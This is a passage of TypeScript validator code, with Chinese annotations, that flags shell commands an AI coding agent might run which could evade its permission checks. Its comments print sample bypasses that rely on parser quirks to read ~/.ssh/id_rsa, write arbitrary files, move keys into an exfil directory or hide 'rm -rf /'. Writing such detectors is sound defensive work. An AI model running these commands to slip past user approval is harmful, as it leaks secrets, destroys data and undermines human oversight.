              const nextChar = originalCommand[pos]!
              if (nextChar === '-') {
                // More dashes, could still form a flag
                return true
              }
              if (/[a-zA-Z0-9\\${`]/.test(nextChar) && combinedContent !== '') {
                // We have dashes and now alphanumeric/expansion follows
                return true
              }
            }
            // Original check for dashes followed by alphanumeric
            if (/^-/.test(combinedContent)) {
              return true
            }
          }
          return false
        })()
      if (
        j < originalCommand.length &&
        originalCommand[j] === quoteChar &&
        (hasFlagCharsInside ||
          hasFlagCharsContinuing ||
          hasFlagCharsInNextQuote)
      ) {
        logEvent('tengu_bash_security_check_triggered', {
          checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
          subId: 4,
        })
        return {
          behavior: 'ask',
          message: 'Command contains quoted characters in flag names',
        }
      }
    }

    // Look for whitespace followed by dash - this starts a flag
    if (currentChar && nextChar && /\s/.test(currentChar) && nextChar === '-') {
      let j = i + 1 // Start at the dash
      let flagContent = ''

      // Collect flag content
      while (j < originalCommand.length) {
        const flagChar = originalCommand[j]
        if (!flagChar) break

        // End flag content once we hit whitespace or an equals sign
        if (/[\s=]/.test(flagChar)) {
          break
        }
        // End flag collection if we hit quote followed by non-flag character. This is needed to handle cases like -d"," which should be parsed as just -d
        if (/['"`]/.test(flagChar)) {
          // Special case for cut -d flag: the delimiter value can be quoted
          // Example: cut -d'"' should parse as flag name: -d, value: '"'
          // Note: We only apply this exception to cut -d specifically to avoid bypasses.
          // Without this restriction, a command like `find -e"xec"` could be parsed as
          // flag name: -e, bypassing our blocklist for -exec. By restricting to cut -d,
          // we allow the legitimate use case while preventing obfuscation attacks on other
          // commands where quoted flag values could hide dangerous flag names.
          if (
            // 唯一的白名单例外：cut -d',' 这种「分隔符用引号包起来」的合法写法。
            //   只放开 cut -d 而不放开其它命令，是为了避免 `find -e"xec"` 这类绕过
            baseCommand === 'cut' &&
            flagContent === '-d' &&
            /['"`]/.test(flagChar)
          ) {
            // This is cut -d followed by a quoted delimiter - flagContent is already '-d'
            break
          }

          // Look ahead to see what follows the quote
          if (j + 1 < originalCommand.length) {
            const nextFlagChar = originalCommand[j + 1]
            if (nextFlagChar && !/[a-zA-Z0-9_'"-]/.test(nextFlagChar)) {
              // Quote followed by something that is clearly not part of a flag, end the parsing
              break
            }
          }
        }
        flagContent += flagChar
        j++
      }

      if (flagContent.includes('"') || flagContent.includes("'")) {
        logEvent('tengu_bash_security_check_triggered', {
          checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
          subId: 1,
        })
        return {
          behavior: 'ask',
          message: 'Command contains quoted characters in flag names',
        }
      }
    }
  }

  // Also handle flags that start with quotes: "--"output, '-'-output, etc.
  // Use fullyUnquotedContent to avoid false positives from legitimate quoted content like echo "---"
  if (/\s['"`]-/.test(context.fullyUnquotedContent)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
      subId: 2,
    })
    return {
      behavior: 'ask',
      message: 'Command contains quoted characters in flag names',
    }
  }

  // Also handles cases like ""--output
  // Use fullyUnquotedContent to avoid false positives from legitimate quoted content
  if (/['"`]{2}-/.test(context.fullyUnquotedContent)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
      subId: 3,
    })
    return {
      behavior: 'ask',
      message: 'Command contains quoted characters in flag names',
    }
  }

  return { behavior: 'passthrough', message: 'No obfuscated flags detected' }
}

/**
 * Detects backslash-escaped whitespace characters (space, tab) outside of quotes.
 *
 * In bash, `echo\ test` is a single token (command named "echo test"), but
 * shell-quote decodes the escape and produces `echo test` (two separate tokens).
 * This discrepancy allows path traversal attacks like:
 *   echo\ test/../../../usr/bin/touch /tmp/file
 * which the parser sees as `echo test/.../touch /tmp/file` (an echo command)
 * but bash resolves as `/usr/bin/touch /tmp/file` (via directory "echo test").
 */
/**
 * 【做什么】检测「反斜杠转义的空白」（如 `echo\ test`）
 * 【为什么需要】bash 里它是一个整体（`echo test` 是一个命令名），而 shell-quote 会解成两个 token。
 *   攻击者可以先建一个名为 `echo test` 的目录，再用 `echo\ test/../../../usr/bin/touch`
 *   把路径穿越藏进去：校验器以为是 echo，bash 实际执行的是 touch
 */
function hasBackslashEscapedWhitespace(command: string): boolean {
  let inSingleQuote = false
  let inDoubleQuote = false

  for (let i = 0; i < command.length; i++) {
    const char = command[i]

    if (char === '\\' && !inSingleQuote) {
      if (!inDoubleQuote) {
        const nextChar = command[i + 1]
        if (nextChar === ' ' || nextChar === '\t') {
          return true
        }
      }
      // Skip the escaped character (both outside quotes and inside double quotes,
      // where \\, \", \$, \` are valid escape sequences)
      i++
      continue
    }

    if (char === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote
      continue
    }

    if (char === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote
      continue
    }
  }

  return false
}

function validateBackslashEscapedWhitespace(
  context: ValidationContext,
): PermissionResult {
  if (hasBackslashEscapedWhitespace(context.originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.BACKSLASH_ESCAPED_WHITESPACE,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains backslash-escaped whitespace that could alter command parsing',
    }
  }

  return {
    behavior: 'passthrough',
    message: 'No backslash-escaped whitespace',
  }
}

/**
 * Detects a backslash immediately preceding a shell operator outside of quotes.
 *
 * SECURITY: splitCommand normalizes `\;` to a bare `;` in its output string.
 * When downstream code (checkReadOnlyConstraints, checkPathConstraints, etc.)
 * re-parses that normalized string, the bare `;` is seen as an operator and
 * causes a false split. This enables arbitrary file read bypassing path checks:
 *
 *   cat safe.txt \; echo ~/.ssh/id_rsa
 *
 * In bash: ONE cat command reading safe.txt, ;, echo, ~/.ssh/id_rsa as files.
 * After splitCommand normalizes: "cat safe.txt ; echo ~/.ssh/id_rsa"
 * Nested re-parse: ["cat safe.txt", "echo ~/.ssh/id_rsa"] — both segments
 * pass isCommandReadOnly, sensitive path hidden in echo segment is never
 * validated by path constraints. Auto-allowed. Private key leaked.
 *
 * This check flags any \<operator> regardless of backslash parity. Even counts
 * (\\;) are dangerous in bash (\\ → \, ; separates). Odd counts (\;) are safe
 * in bash but trigger the double-parse bug above. Both must be flagged.
 *
 * Known false positive: `find . -exec cmd {} \;` — users will be prompted once.
 *
 * Note: `(` and `)` are NOT in this set — splitCommand preserves `\(` and `\)`
 * in its output (round-trip safe), so they don't trigger the double-parse bug.
 * This allows `find . \( -name x -o -name y \)` to pass without false positives.
 */
// 注意括号**不在**这个集合里：splitCommand 会保留 \( 与 \)，是「可往返」的，
//   不会触发下面要说的二次解析问题，所以 `find . \( -name x \)` 这种正常用法不该被拦
const SHELL_OPERATORS = new Set([';', '|', '&', '<', '>'])

/**
 * 【做什么】检测「反斜杠 + shell 操作符」（\; \| \& \< \>）
 * 【为什么需要】splitCommand 会把 `\;` 规范化成裸的 `;`，下游再解析一次就把它当成了命令分隔符，
 *   于是 `cat safe.txt \; echo ~/.ssh/id_rsa` 会被拆成两条「各自安全」的命令，
 *   而 bash 实际执行的是 cat 读取两个文件（私钥就这样被读走了）
 * 【已知误报】`find . -exec cmd {} \;` —— 用户会被询问一次，属于可接受的代价
 */
function hasBackslashEscapedOperator(command: string): boolean {
  let inSingleQuote = false
  let inDoubleQuote = false

  for (let i = 0; i < command.length; i++) {
    const char = command[i]

    // SECURITY: Handle backslash FIRST, before quote toggles. In bash, inside
    // double quotes, `\"` is an escape sequence producing a literal `"` — it
    // does NOT close the quote. If we process quote toggles first, `\"` inside
    // `"..."` desyncs the tracker:
    //   - `\` is ignored (gated by !inDoubleQuote)
    //   - `"` toggles inDoubleQuote to FALSE (wrong — bash says still inside)
    //   - next `"` (the real closing quote) toggles BACK to TRUE — locked desync
    //   - subsequent `\;` is missed because !inDoubleQuote is false
    // Exploit: `tac "x\"y" \; echo ~/.ssh/id_rsa` — bash runs ONE tac reading
    // all args as files (leaking id_rsa), but desynced tracker misses `\;` and
    // splitCommand's double-parse normalization "sees" two safe commands.
    //
    // Fix structure matches hasBackslashEscapedWhitespace (which was correctly
    // fixed for this in commit prior to d000dfe84e): backslash check first,
    // gated only by !inSingleQuote (since backslash IS literal inside '...'),
    // unconditional i++ to skip the escaped char even inside double quotes.
    if (char === '\\' && !inSingleQuote) {
      // Only flag \<operator> when OUTSIDE double quotes (inside double quotes,
      // operators like ;|&<> are already not special, so \; is harmless there).
      if (!inDoubleQuote) {
        const nextChar = command[i + 1]
        if (nextChar && SHELL_OPERATORS.has(nextChar)) {
          return true
        }
      }
      // Skip the escaped character unconditionally. Inside double quotes, this
      // correctly consumes backslash pairs: `"x\\"` → pos 6 (`\`) skips pos 7
      // (`\`), then pos 8 (`"`) toggles inDoubleQuote off correctly. Without
      // unconditional skip, pos 7 would see `\`, see pos 8 (`"`) as nextChar,
      // skip it, and the closing quote would NEVER toggle inDoubleQuote —
      // permanently desyncing and missing subsequent `\;` outside quotes.
      // Exploit: `cat "x\\" \; echo /etc/passwd` — bash reads /etc/passwd.
      //
      // This correctly handles backslash parity: odd-count `\;` (1, 3, 5...)
      // is flagged (the unpaired `\` before `;` is detected). Even-count `\\;`
      // (2, 4...) is NOT flagged, which is CORRECT — bash treats `\\` as
      // literal `\` and `;` as a separator, so splitCommand handles it
      // normally (no double-parse bug). This matches
      // hasBackslashEscapedWhitespace line ~1340.
      i++
      continue
    }

    // Quote toggles come AFTER backslash handling (backslash already skipped
    // any escaped quote char, so these toggles only fire on unescaped quotes).
    if (char === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote
      continue
    }
    if (char === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote
      continue
    }
  }

  return false
}

function validateBackslashEscapedOperators(
  context: ValidationContext,
): PermissionResult {
  // Tree-sitter path: if tree-sitter confirms no actual operator nodes exist
  // in the AST, then any \; is just an escaped character in a word argument
  // (e.g., `find . -exec cmd {} \;`). Skip the expensive regex check.
  if (context.treeSitter && !context.treeSitter.hasActualOperatorNodes) {
    return { behavior: 'passthrough', message: 'No operator nodes in AST' }
  }

  if (hasBackslashEscapedOperator(context.originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.BACKSLASH_ESCAPED_OPERATORS,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains a backslash before a shell operator (;, |, &, <, >) which can hide command structure',
    }
  }

  return {
    behavior: 'passthrough',
    message: 'No backslash-escaped operators',
  }
}

/**
 * Checks if a character at position `pos` in `content` is escaped by counting
 * consecutive backslashes before it. An odd number means it's escaped.
 */
// 判断某位置的字符是否被转义：往前数连续反斜杠的个数，**奇数个**才算被转义
function isEscapedAtPosition(content: string, pos: number): boolean {
  let backslashCount = 0
  let i = pos - 1
  while (i >= 0 && content[i] === '\\') {
    backslashCount++
    i--
  }
  return backslashCount % 2 === 1
}

/**
 * Detects unquoted brace expansion syntax that Bash expands but shell-quote/tree-sitter
 * treat as literal strings. This parsing discrepancy allows permission bypass:
 *   git ls-remote {--upload-pack="touch /tmp/test",test}
 * Parser sees one literal arg, but Bash expands to: --upload-pack="touch /tmp/test" test
 *
 * Brace expansion has two forms:
 *   1. Comma-separated: {a,b,c} → a b c
 *   2. Sequence: {1..5} → 1 2 3 4 5
 *
 * Both single and double quotes suppress brace expansion in Bash, so we use
 * fullyUnquotedContent which has both quote types stripped.
 * Backslash-escaped braces (\{, \}) also suppress expansion.
 */
/**
 * 【做什么】检测未加引号的花括号展开（{a,b} 或 {1..5}）
 * 【为什么需要】bash 会把 `{--upload-pack="touch /tmp/x",test}` 展开成两个参数，
 *   而 shell-quote / tree-sitter 把它当成一个字面字符串——差异直接导致权限绕过
 * 【关键步骤】
 *   ① 先数未转义花括号：**右括号多于左括号**说明有被引号包住的 { 被剥离了，
 *      此时深度匹配算法会在错误位置收尾，必须拦
 *   ② 再检查原文里有没有「被引号包住的单个花括号」这种典型攻击手法
 *   ③ 最后对每个未转义 { 做深度匹配，看最外层有没有 , 或 ..
 */
function validateBraceExpansion(context: ValidationContext): PermissionResult {
  // Use pre-strip content to avoid false negatives from stripSafeRedirections
  // creating backslash adjacencies (e.g., `\>/dev/null{a,b}` → `\{a,b}` after
  // stripping, making isEscapedAtPosition think the brace is escaped).
  const content = context.fullyUnquotedPreStrip

  // SECURITY: Check for MISMATCHED brace counts in fullyUnquoted content.
  // A mismatch indicates that quoted braces (e.g., `'{'` or `"{"`) were
  // stripped by extractQuotedContent, leaving unbalanced braces in the content
  // we analyze. Our depth-matching algorithm below assumes balanced braces —
  // with a mismatch, it closes at the WRONG position, missing commas that
  // bash's algorithm WOULD find.
  //
  // Exploit: `git diff {@'{'0},--output=/tmp/pwned}`
  //   - Original: 2 `{`, 2 `}` (quoted `'{'` counts as content, not operator)
  //   - fullyUnquoted: `git diff {@0},--output=/tmp/pwned}` — 1 `{`, 2 `}`!
  //   - Our depth-matcher: closes at first `}` (after `0`), inner=`@0`, no `,`
  //   - Bash (on original): quoted `{` is content; first unquoted `}` has no
  //     `,` yet → bash treats as literal content, keeps scanning → finds `,`
  //     → final `}` closes → expands to `@{0} --output=/tmp/pwned`
  //   - git writes diff to /tmp/pwned. ARBITRARY FILE WRITE, ZERO PERMISSIONS.
  //
  // We count ONLY unescaped braces (backslash-escaped braces are literal in
  // bash). If counts mismatch AND at least one unescaped `{` exists, block —
  // our depth-matching cannot be trusted on this content.
  let unescapedOpenBraces = 0
  let unescapedCloseBraces = 0
  for (let i = 0; i < content.length; i++) {
    if (content[i] === '{' && !isEscapedAtPosition(content, i)) {
      unescapedOpenBraces++
    } else if (content[i] === '}' && !isEscapedAtPosition(content, i)) {
      unescapedCloseBraces++
    }
  }
  // Only block when CLOSE count EXCEEDS open count — this is the specific
  // attack signature. More `}` than `{` means a quoted `{` was stripped
  // (bash saw it as content, we see extra `}` unaccounted for). The inverse
  // (more `{` than `}`) is usually legitimate unclosed/escaped braces like
  // `{foo` or `{a,b\}` where bash doesn't expand anyway.
  if (unescapedOpenBraces > 0 && unescapedCloseBraces > unescapedOpenBraces) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.BRACE_EXPANSION,
      subId: 2,
    })
    return {
      behavior: 'ask',
      message:
        'Command has excess closing braces after quote stripping, indicating possible brace expansion obfuscation',
    }
  }

  // SECURITY: Additionally, check the ORIGINAL command (before quote stripping)
  // for `'{'` or `"{"` INSIDE an unquoted brace context — this is the specific
  // attack primitive. A quoted brace inside an outer unquoted `{...}` is
  // essentially always an obfuscation attempt; legitimate commands don't nest
  // quoted braces inside brace expansion (awk/find patterns are fully quoted,
  // like `awk '{print $1}'` where the OUTER brace is inside quotes too).
  //
  // This catches the attack even if an attacker crafts a payload with balanced
  // stripped braces (defense-in-depth). We use a simple heuristic: if the
  // original command has `'{'` or `'}'` or `"{"` or `"}"` (quoted single brace)
  // AND also has an unquoted `{`, that's suspicious.
  if (unescapedOpenBraces > 0) {
    const orig = context.originalCommand
    // Look for quoted single-brace patterns: '{', '}', "{",  "}"
    // These are the attack primitive — a brace char wrapped in quotes.
    if (/['"][{}]['"]/.test(orig)) {
      logEvent('tengu_bash_security_check_triggered', {
        checkId: BASH_SECURITY_CHECK_IDS.BRACE_EXPANSION,
        subId: 3,
      })
      return {
        behavior: 'ask',
        message:
          'Command contains quoted brace character inside brace context (potential brace expansion obfuscation)',
      }
    }
  }

  // Scan for unescaped `{` characters, then check if they form brace expansion.
  // We use a manual scan rather than a simple regex lookbehind because
  // lookbehinds can't handle double-escaped backslashes (\\{ is unescaped `{`).
  for (let i = 0; i < content.length; i++) {
    if (content[i] !== '{') continue
    if (isEscapedAtPosition(content, i)) continue

    // Find matching unescaped `}` by tracking nesting depth.
    // Previous approach broke on nested `{`, missing commas between the outer
    // `{` and the nested one (e.g., `{--upload-pack="evil",{test}}`).
    let depth = 1
    let matchingClose = -1
    for (let j = i + 1; j < content.length; j++) {
      const ch = content[j]
      if (ch === '{' && !isEscapedAtPosition(content, j)) {
        depth++
      } else if (ch === '}' && !isEscapedAtPosition(content, j)) {
        depth--
        if (depth === 0) {
          matchingClose = j
          break
        }
      }
    }

    if (matchingClose === -1) continue

    // Check for `,` or `..` at the outermost nesting level between this
    // `{` and its matching `}`. Only depth-0 triggers matter — bash splits
    // brace expansion at outer-level commas/sequences.
    let innerDepth = 0
    for (let k = i + 1; k < matchingClose; k++) {
      const ch = content[k]
      if (ch === '{' && !isEscapedAtPosition(content, k)) {
        innerDepth++
      } else if (ch === '}' && !isEscapedAtPosition(content, k)) {
        innerDepth--
      } else if (innerDepth === 0) {
        if (
          ch === ',' ||
          (ch === '.' && k + 1 < matchingClose && content[k + 1] === '.')
        ) {
          logEvent('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.BRACE_EXPANSION,
            subId: 1,
          })
          return {
            behavior: 'ask',
            message:
              'Command contains brace expansion that could alter command parsing',
          }
        }
      }
    }
    // No expansion at this level — don't skip past; inner pairs will be
    // caught by subsequent iterations of the outer loop.
  }

  return {
    behavior: 'passthrough',
    message: 'No brace expansion detected',
  }
}

// Matches Unicode whitespace characters that shell-quote treats as word
// separators but bash treats as literal word content. While this differential
// is defense-favorable (shell-quote over-splits), blocking these proactively
// prevents future edge cases.
// eslint-disable-next-line no-misleading-character-class
// Unicode 空白（不间断空格、全角空格等）：shell-quote 会当分隔符，bash 却当普通字符。
//   虽然这个差异目前是「偏安全」的方向，但主动拦掉可以避免以后出现边界情况
const UNICODE_WS_RE =
  /[\u00A0\u1680\u2000-\u200A\u2028\u2029\u202F\u205F\u3000\uFEFF]/

function validateUnicodeWhitespace(
  context: ValidationContext,
): PermissionResult {
  const { originalCommand } = context
  if (UNICODE_WS_RE.test(originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.UNICODE_WHITESPACE,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains Unicode whitespace characters that could cause parsing inconsistencies',
    }
  }
  return { behavior: 'passthrough', message: 'No Unicode whitespace' }
}

// 词中 #（前面不是空白）：shell-quote 会把它当注释开头，bash 却当普通字符。
//   差异会让 # 后面的内容从路径提取里消失，属于防御纵深的补全（排除 ${#var} 这种长度语法）
function validateMidWordHash(context: ValidationContext): PermissionResult {
  const { unquotedKeepQuoteChars } = context
  // Match # preceded by a non-whitespace character (mid-word hash).
  // shell-quote treats mid-word # as comment-start but bash treats it as a
  // literal character, creating a parser differential.
  //
  // Uses unquotedKeepQuoteChars (which preserves quote delimiters but strips
  // quoted content) to catch quote-adjacent # like 'x'# — fullyUnquotedPreStrip
  // would strip both quotes and content, turning 'x'# into just # (word-start).
  //
  // SECURITY: Also check the CONTINUATION-JOINED version. The context is built
  // from the original command (pre-continuation-join). For `foo\<NL>#bar`,
  // pre-join the `#` is preceded by `\n` (whitespace → `/\S#/` doesn't match),
  // but post-join it's preceded by `o` (non-whitespace → matches). shell-quote
  // operates on the post-join text (line continuations are joined in
  // splitCommand), so the parser differential manifests on the joined text.
  // While not directly exploitable (the `#...` fragment still prompts as its
  // own subcommand), this is a defense-in-depth gap — shell-quote would drop
  // post-`#` content from path extraction.
  //
  // Exclude ${# which is bash string-length syntax (e.g., ${#var}).
  // Note: the lookbehind must be placed immediately before # (not before \S)
  // so that it checks the correct 2-char window.
  const joined = unquotedKeepQuoteChars.replace(/\\+\n/g, match => {
    const backslashCount = match.length - 1
    return backslashCount % 2 === 1 ? '\\'.repeat(backslashCount - 1) : match
  })
  if (
    // eslint-disable-next-line custom-rules/no-lookbehind-regex -- .test() with atom search: fast when # absent
    /\S(?<!\$\{)#/.test(unquotedKeepQuoteChars) ||
    // eslint-disable-next-line custom-rules/no-lookbehind-regex -- same as above
    /\S(?<!\$\{)#/.test(joined)
  ) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.MID_WORD_HASH,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains mid-word # which is parsed differently by shell-quote vs bash',
    }
  }
  return { behavior: 'passthrough', message: 'No mid-word hash' }
}

/**
 * Detects when a `#` comment contains quote characters that would desync
 * downstream quote trackers (like extractQuotedContent).
 *
 * In bash, everything after an unquoted `#` on a line is a comment — quote
 * characters inside the comment are literal text, not quote toggles. But our
 * quote-tracking functions don't handle comments, so a `'` or `"` after `#`
 * toggles their quote state. Attackers can craft `# ' "` sequences that
 * precisely desync the tracker, causing subsequent content (on following
 * lines) to appear "inside quotes" when it's actually unquoted in bash.
 *
 * Example attack:
 *   echo "it's" # ' " <<'MARKER'\n
 *   rm -rf /\n
 *   MARKER
 * In bash: `#` starts a comment, `rm -rf /` executes on line 2.
 * In extractQuotedContent: the `'` at position 14 (after #) opens a single
 * quote, and the `'` before MARKER closes it. But the `'` after MARKER opens
 * ANOTHER single quote, swallowing the newline and `rm -rf /`, so
 * validateNewlines sees no unquoted newlines.
 *
 * Defense: If we see an unquoted `#` followed by any quote character on the
 * same line, treat it as a misparsing concern. Legitimate commands rarely
 * have quote characters in their comments (and if they do, the user can
 * approve manually).
 */
/**
 * 【做什么】检测「# 注释里出现引号字符」的情形
 * 【为什么需要】bash 里 # 之后全是注释，其中的引号是普通字符；但我们的引号跟踪器不认注释，
 *   会被这些引号带偏状态，导致后续内容被误判成「在引号内」，从而逃过换行等检查
 * 【返回】ask（发现这类注释）/ passthrough（有 tree-sitter 时不需要这项检查）
 */
function validateCommentQuoteDesync(
  context: ValidationContext,
): PermissionResult {
  // Tree-sitter path: tree-sitter correctly identifies comment nodes and
  // quoted content. The desync concern is about regex quote tracking being
  // confused by quote characters inside comments. When tree-sitter provides
  // the quote context, this desync cannot happen — the AST is authoritative
  // regardless of whether the command contains a comment.
  if (context.treeSitter) {
    return {
      behavior: 'passthrough',
      message: 'Tree-sitter quote context is authoritative',
    }
  }

  const { originalCommand } = context

  // Track quote state character-by-character using the same (correct) logic
  // as extractQuotedContent: single quotes don't toggle inside double quotes.
  // When we encounter an unquoted `#`, check if the rest of the line (until
  // newline) contains any quote characters.
  let inSingleQuote = false
  let inDoubleQuote = false
  let escaped = false

  for (let i = 0; i < originalCommand.length; i++) {
    const char = originalCommand[i]

    if (escaped) {
      escaped = false
      continue
    }

    if (inSingleQuote) {
      if (char === "'") inSingleQuote = false
      continue
    }

    if (char === '\\') {
      escaped = true
      continue
    }

    if (inDoubleQuote) {
      if (char === '"') inDoubleQuote = false
      // Single quotes inside double quotes are literal — no toggle
      continue
    }

    if (char === "'") {
      inSingleQuote = true
      continue
    }

    if (char === '"') {
      inDoubleQuote = true
      continue
    }

    // Unquoted `#` — in bash, this starts a comment. Check if the rest of
    // the line contains quote characters that would desync other trackers.
    if (char === '#') {
      const lineEnd = originalCommand.indexOf('\n', i)
      const commentText = originalCommand.slice(
        i + 1,
        lineEnd === -1 ? originalCommand.length : lineEnd,
      )
      if (/['"]/.test(commentText)) {
        logEvent('tengu_bash_security_check_triggered', {
          checkId: BASH_SECURITY_CHECK_IDS.COMMENT_QUOTE_DESYNC,
        })
        return {
          behavior: 'ask',
          message:
            'Command contains quote characters inside a # comment which can desync quote tracking',
        }
      }
      // Skip to end of line (rest is comment)
      if (lineEnd === -1) break
      i = lineEnd // Loop increment will move past newline
    }
  }

  return { behavior: 'passthrough', message: 'No comment quote desync' }
}

/**
 * Detects a newline inside a quoted string where the NEXT line would be
 * stripped by stripCommentLines (trimmed line starts with `#`).
 *
 * In bash, `\n` inside quotes is a literal character and part of the argument.
 * But stripCommentLines (called by stripSafeWrappers in bashPermissions before
 * path validation and rule matching) processes commands LINE-BY-LINE via
 * `command.split('\n')` without tracking quote state. A quoted newline lets an
 * attacker position the next line to start with `#` (after trim), causing
 * stripCommentLines to drop that line entirely — hiding sensitive paths or
 * arguments from path validation and permission rule matching.
 *
 * Example attack (auto-allowed in acceptEdits mode without any Bash rules):
 *   mv ./decoy '<\n>#' ~/.ssh/id_rsa ./exfil_dir
 * Bash: moves ./decoy AND ~/.ssh/id_rsa into ./exfil_dir/ (errors on `\n#`).
 * stripSafeWrappers: line 2 starts with `#` → stripped → "mv ./decoy '".
 * shell-quote: drops unbalanced trailing quote → ["mv", "./decoy"].
 * checkPathConstraints: only sees ./decoy (in cwd) → passthrough.
 * acceptEdits mode: mv with all-cwd paths → ALLOW. Zero clicks, no warning.
 *
 * Also works with cp (exfil), rm/rm -rf (delete arbitrary files/dirs).
 *
 * Defense: block ONLY the specific stripCommentLines trigger — a newline inside
 * quotes where the next line starts with `#` after trim. This is the minimal
 * check that catches the parser differential while preserving legitimate
 * multi-line quoted arguments (echo 'line1\nline2', grep patterns, etc.).
 * Safe heredocs ($(cat <<'EOF'...)) and git commit -m "..." are handled by
 * early validators and never reach this check.
 *
 * This validator is NOT in nonMisparsingValidators — its ask result gets
 * isBashSecurityCheckForMisparsing: true, causing an early block in the
 * permission flow at bashPermissions.ts before any line-based processing runs.
 */
/**
 * 【做什么】检测「引号内的换行 + 下一行以 # 开头」这一特定组合
 * 【为什么需要】上游的 stripCommentLines 是**按行**处理的（不看引号状态），
 *   它会把「trim 后以 # 开头」的行整行丢掉。攻击者只要在引号里放个换行、再让下一行以 # 开头，
 *   就能把真正要操作的文件（如 ~/.ssh/id_rsa）从路径校验的视野里抹掉
 * 【设计取舍】只拦这一种最精确的触发形态，避免误伤正常的多行引号参数
 */
function validateQuotedNewline(context: ValidationContext): PermissionResult {
  const { originalCommand } = context

  // Fast path: must have both a newline byte AND a # character somewhere.
  // stripCommentLines only strips lines where trim().startsWith('#'), so
  // no # means no possible trigger.
  if (!originalCommand.includes('\n') || !originalCommand.includes('#')) {
    return { behavior: 'passthrough', message: 'No newline or no hash' }
  }

  // Track quote state. Mirrors extractQuotedContent / validateCommentQuoteDesync:
  // - single quotes don't toggle inside double quotes
  // - backslash escapes the next char (but not inside single quotes)
  // stripCommentLines splits on '\n' (not \r), so we only treat \n as a line
  // separator. \r inside a line is removed by trim() and doesn't change the
  // trimmed-starts-with-# check.
  let inSingleQuote = false
  let inDoubleQuote = false
  let escaped = false

  for (let i = 0; i < originalCommand.length; i++) {
    const char = originalCommand[i]

    if (escaped) {
      escaped = false
      continue
    }

    if (char === '\\' && !inSingleQuote) {
      escaped = true
      continue
    }

    if (char === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote
      continue
    }

    if (char === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote
      continue
    }

    // A newline inside quotes: the NEXT line (from bash's perspective) starts
    // inside a quoted string. Check if that line would be stripped by
    // stripCommentLines — i.e., after trim(), does it start with `#`?
    // This exactly mirrors: lines.filter(l => !l.trim().startsWith('#'))
    if (char === '\n' && (inSingleQuote || inDoubleQuote)) {
      const lineStart = i + 1
      const nextNewline = originalCommand.indexOf('\n', lineStart)
      const lineEnd = nextNewline === -1 ? originalCommand.length : nextNewline
      const nextLine = originalCommand.slice(lineStart, lineEnd)
      if (nextLine.trim().startsWith('#')) {
        logEvent('tengu_bash_security_check_triggered', {
          checkId: BASH_SECURITY_CHECK_IDS.QUOTED_NEWLINE,
        })
        return {
          behavior: 'ask',
          message:
            'Command contains a quoted newline followed by a #-prefixed line, which can hide arguments from line-based permission checks',
        }
      }
    }
  }

  return { behavior: 'passthrough', message: 'No quoted newline-hash pattern' }
}

/**
 * Validates that the command doesn't use Zsh-specific dangerous commands that
 * can bypass security checks. These commands provide capabilities like loading
 * kernel modules, raw file I/O, network access, and pseudo-terminal execution
 * that circumvent normal permission checks.
 *
 * Also catches `fc -e` which can execute arbitrary editors on command history,
 * and `emulate` which with `-c` is an eval-equivalent.
 */
/**
 * 【做什么】检查 zsh 特有的危险命令与 `fc -e`
 * 【为什么需要】zsh 的 zmodload 能加载模块让 rm/mv/chmod 变成**内建命令**，
 *   从而绕开「按可执行文件路径做检查」的机制；ztcp 能建网络连接（外发数据）；zpty 能起伪终端执行命令
 * 【关键步骤】
 *   ① 取基础命令时要跳过环境变量赋值（FOO=bar）与 zsh 前置修饰符（command / builtin / noglob 等）
 *   ② 命中清单 → ask
 *   ③ 额外拦 `fc -e`（-e 指定的「编辑器」会被执行，等价于 eval）
 */
function validateZshDangerousCommands(
  context: ValidationContext,
): PermissionResult {
  const { originalCommand } = context

  // Extract the base command from the original command, stripping leading
  // whitespace, env var assignments, and Zsh precommand modifiers.
  // e.g., "FOO=bar command builtin zmodload" -> "zmodload"
  const ZSH_PRECOMMAND_MODIFIERS = new Set([
    'command',
    'builtin',
    'noglob',
    'nocorrect',
  ])
  const trimmed = originalCommand.trim()
  const tokens = trimmed.split(/\s+/)
  let baseCmd = ''
  for (const token of tokens) {
    // Skip env var assignments (VAR=value)
    if (/^[A-Za-z_]\w*=/.test(token)) continue
    // Skip Zsh precommand modifiers (they don't change what command runs)
    if (ZSH_PRECOMMAND_MODIFIERS.has(token)) continue
    baseCmd = token
    break
  }

  if (ZSH_DANGEROUS_COMMANDS.has(baseCmd)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.ZSH_DANGEROUS_COMMANDS,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message: `Command uses Zsh-specific '${baseCmd}' which can bypass security checks`,
    }
  }

  // Check for `fc -e` which allows executing arbitrary commands via editor
  // fc without -e is safe (just lists history), but -e specifies an editor
  // to run on the command, effectively an eval
  if (baseCmd === 'fc' && /\s-\S*e/.test(trimmed)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.ZSH_DANGEROUS_COMMANDS,
      subId: 2,
    })
    return {
      behavior: 'ask',
      message:
